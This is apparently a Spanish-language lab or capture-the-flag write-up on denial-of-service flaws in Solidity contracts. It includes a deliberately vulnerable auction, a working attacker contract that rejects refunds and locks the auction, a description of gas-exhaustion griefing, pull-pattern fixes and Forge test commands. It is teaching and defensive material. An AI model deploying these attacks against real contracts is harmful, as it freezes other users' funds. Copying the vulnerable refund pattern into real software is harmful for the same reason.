# C3. Llamadas externas y denegación de servicio: writeup

Este documento explica cómo resolver el reto del caso C3 y las otras dos variantes que se estudian en el laboratorio. El análisis completo está en la sección 4.3 de la memoria.

## El reto: La Subasta Bloqueada

En Polonio el reto se llama `SubastaBloqueada`. En el laboratorio, el contrato equivalente es `SubastaVulnerable` (`src/C3-llamadas-dos/Vulnerable.sol`).

**Escenario.** Una subasta acepta pujas en Ether. Cada puja nueva tiene que superar a la anterior, y la subasta devuelve su dinero al postor que queda desbancado.

**Objetivo.** Convertirte en ganador permanente: que nadie pueda volver a superar tu puja. Aquí el éxito no es robar fondos, sino dejar inoperativa una función. Por eso, para comprobarlo, Polonio simula una puja honesta de 1.000 ETH desde tu cuenta y da el reto por resuelto si esa puja revierte.

## La vulnerabilidad

```solidity
function pujar() external payable {
    require(msg.value > mejorPuja, "puja baja");

    // FALLO: si el postor anterior rechaza el Ether, este reembolso revierte
    // y bloquea toda la subasta (patrón push).
    if (mejorPostor != address(0)) {
        payable(mejorPostor).transfer(mejorPuja);
    }

    mejorPostor = msg.sender;
    mejorPuja = msg.value;
}
```

La subasta *empuja* el reembolso al postor anterior dentro de la propia puja. Si ese reembolso falla, `transfer` revierte y arrastra toda la transacción, incluida la puja nueva. El fallo de un solo participante bloquea a todos los demás.

Un contrato puede negarse a recibir Ether con una función `receive` que siempre revierte. Si ese contrato es el mejor postor, cualquier puja posterior intentará reembolsarle, el reembolso fallará y la puja nunca se completará.

## Resolución paso a paso

1. **Escribir un contrato postor que rechace los reembolsos:**

   ```solidity
   interface ISubasta {
       function pujar() external payable;
   }

   contract Postor {
       ISubasta public subasta;

       constructor(address _subasta) {
           subasta = ISubasta(_subasta);
       }

       function pujar() external payable {
           subasta.pujar{value: msg.value}();
       }

       // Cualquier reembolso hacia este contrato revierte.
       receive() external payable {
           revert("no acepto reembolsos");
       }
   }
   ```

2. **Desplegarlo** pasando la dirección de la subasta.
3. **Pujar a través del contrato**, llamando a `Postor.pujar()` con una cantidad mayor que la puja actual (por ejemplo 1 ETH si la subasta está vacía). Si antes había otro postor, recibe su reembolso con normalidad, porque es él quien acepta el Ether.
4. **Comprobar el bloqueo.** Intenta pujar desde tu cuenta con más Ether. La subasta intenta devolver su puja a tu contrato, `receive` revierte y tu puja revierte con él. Nadie puede ya desbancar al contrato.
5. **Verificar.** En Polonio, *Verificar solución* simula la puja de 1.000 ETH, comprueba que revierte y da el reto por resuelto.

## Otras variantes del caso

**Valor de retorno ignorado** (`RecompensasVulnerable`). `reclamar()` pone la deuda a cero y paga con `send`, pero no comprueba si el envío funcionó. `send` no revierte cuando falla: devuelve `false`. Si el receptor rechaza el Ether, la deuda queda marcada como pagada aunque el dinero nunca salió. La víctima es quien reclama, que pierde lo que se le debía.

**Bucle no acotado** (`RepartoVulnerable`). `repartir()` recorre todos los participantes y paga a cada uno en la misma transacción, y registrarse es gratis y sin límite. El ataque consiste en registrar muchas direcciones (la prueba usa 1.001 participantes en total) hasta que el coste de `repartir()` supera el gas máximo de un bloque. La prueba mide unos 36,9 millones de gas, por encima del límite de 30 millones: la función no puede ejecutarse nunca y el bote queda bloqueado.

## Mitigación

La versión corregida (`src/C3-llamadas-dos/Fixed.sol`) usa el patrón *pull*: la subasta no envía el reembolso, lo anota, y cada postor lo retira en una transacción propia.

```solidity
function pujar() external payable {
    require(msg.value > mejorPuja, "puja baja");

    if (mejorPostor != address(0)) {
        reembolsos[mejorPostor] += mejorPuja; // se apunta, no se envía
    }

    mejorPostor = msg.sender;
    mejorPuja = msg.value;
}
```

Si el contrato del atacante rechaza su reembolso, solo se perjudica a sí mismo: su dinero queda anotado y la subasta sigue funcionando.

Para las otras variantes:

- **Retorno ignorado**: comprobar siempre el resultado de `send` o de `call` y revertir si es `false`, de modo que el estado no se dé por pagado.
- **Bucle no acotado**: el mismo patrón *pull* en dos fases. Una función de coste constante fija la cuota y cada participante la reclama por su cuenta. La prueba mide unos 70.000 de gas para `repartir()`, sea cual sea el número de participantes.

## Comprobarlo en el laboratorio

```bash
./forge test --match-contract C3_LlamadasDoS
./forge test --match-contract C3_LlamadasDoS --match-test test_Exploit_BucleNoAcotado_Vulnerable -vv
```

Con `-vv` se ven los mensajes de la prueba con el gas medido.

| Variante | Ataque | Mitigación |
|---|---|---|
| Reembolso *push* | `test_Exploit_Vulnerable` | `test_Fixed_Resiste` |
| Retorno ignorado | `test_Exploit_UncheckedReturn_Vulnerable` | `test_Fixed_UncheckedReturn_Resiste` |
| Bucle no acotado | `test_Exploit_BucleNoAcotado_Vulnerable` | `test_Fixed_BucleNoAcotado_Resiste` |
